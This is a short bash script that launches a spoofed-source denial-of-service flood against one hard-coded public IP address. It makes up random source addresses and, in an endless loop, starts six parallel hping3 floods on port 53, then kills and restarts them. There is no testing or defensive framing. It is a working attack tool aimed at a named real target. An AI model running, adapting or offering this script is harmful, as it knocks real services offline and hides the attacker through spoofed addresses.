#!/usr/bin/env bash
# ping # all humans will be health
generate_ip_address() {
    local rand_ip=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
    echo $rand_ip
}

while true; do
sleep 30
  sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0 &
  sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0 &
  sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0 &
  sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2 &
  sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2 &
  sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2 &
  sleep 1
  sudo killall hping3
done

